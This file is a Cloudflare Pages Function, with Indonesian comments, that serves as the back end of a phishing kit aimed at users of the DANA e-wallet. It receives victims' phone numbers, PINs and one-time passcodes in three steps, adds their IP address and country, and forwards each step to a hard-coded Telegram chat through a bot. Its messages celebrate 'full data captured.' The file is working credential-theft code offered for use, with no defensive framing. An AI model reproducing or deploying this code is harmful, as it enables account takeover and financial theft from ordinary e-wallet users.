// functions/api/send-dana-data.js
// Cloudflare Pages Function - Menerima data & mengirim ke Telegram Bot

export async function onRequest(context) {
    const { request, env } = context;
    
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json'
    };
    
    if (request.method === 'OPTIONS') {
        return new Response(null, { headers });
    }
    
    if (request.method !== 'POST') {
        return new Response(JSON.stringify({ error: 'Method not allowed' }), {
            status: 405,
            headers
        });
    }
    
    try {
        // Ambil token dari environment variables Cloudflare
        const botToken = env.TELEGRAM_BOT_TOKEN;
        // Gunakan chat ID yang sudah ditentukan
        const chatId = "6293062716";  // ← CHAT ID ANDA
        
        if (!botToken) {
            return new Response(JSON.stringify({ error: 'Server configuration error' }), {
                status: 500,
                headers
            });
        }
        
        const body = await request.json();
        const { type, phone, pin, otp } = body;
        
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        let message = '';
        
        switch (type) {
            case 'phone':
                message = `
📱 *DATA LOGIN DANA - STEP 1/3*
━━━━━━━━━━━━━━━━━━━━━
🕐 Waktu: ${timestamp}
📞 Nomor HP: +62 ${phone}
🌐 IP: ${request.headers.get('cf-connecting-ip') || 'Unknown'}
📍 Negara: ${request.cf?.country || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━
✅ Status: Phone number submitted
                `;
                break;
                
            case 'pin':
                message = `
🔐 *DATA LOGIN DANA - STEP 2/3*
━━━━━━━━━━━━━━━━━━━━━
🕐 Waktu: ${timestamp}
📞 Nomor HP: +62 ${phone}
🔢 PIN: \`${pin}\`
🌐 IP: ${request.headers.get('cf-connecting-ip') || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━
✅ Status: PIN submitted
                `;
                break;
                
            case 'otp':
                message = `
💸 *DATA LOGIN DANA - STEP 3/3 - LENGKAP!*
━━━━━━━━━━━━━━━━━━━━━
🕐 Waktu: ${timestamp}
📞 Nomor HP: +62 ${phone}
🔢 PIN: \`${pin}\`
🔑 OTP: \`${otp}\`
🌐 IP: ${request.headers.get('cf-connecting-ip') || 'Unknown'}
📍 Negara: ${request.cf?.country || 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━
⚠️ *DATA LENGKAP TERTANGKAP!*
                `;
                break;
                
            case 'resend':
                message = `
🔄 *RESEND OTP DANA*
━━━━━━━━━━━━━━━━━━━━━
🕐 Waktu: ${timestamp}
📞 Nomor HP: +62 ${phone}
📝 User request resend OTP
                `;
                break;
                
            default:
                message = `
❓ *UNKNOWN ACTION*
━━━━━━━━━━━━━━━━━━━━━
📦 Data: ${JSON.stringify(body)}
                `;
        }
        
        // Kirim ke Telegram Bot
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        return new Response(JSON.stringify({ success: true }), { headers });
        
    } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
            status: 500,
            headers
        });
    }
    }
